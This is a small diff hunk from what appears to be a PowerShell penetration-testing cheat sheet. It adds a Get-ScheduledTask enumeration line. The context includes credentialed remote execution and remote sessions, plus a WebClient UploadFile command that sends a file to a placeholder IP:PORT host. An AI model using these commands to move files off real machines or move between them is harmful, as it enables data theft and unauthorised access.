@@ -15,3 +15,4 @@ Start-Process -FilePath "powershell" -ArgumentList COMMAND -Credential $cred
 (New-Object Net.WebClient).UploadFile('http://IP:PORT/FILE', 'FILE')
 Enter-PSSession -ComputerName COMPUTER -Credential $cred
 Get-CimInstance -ClassName win32_service
+Get-ScheduledTask
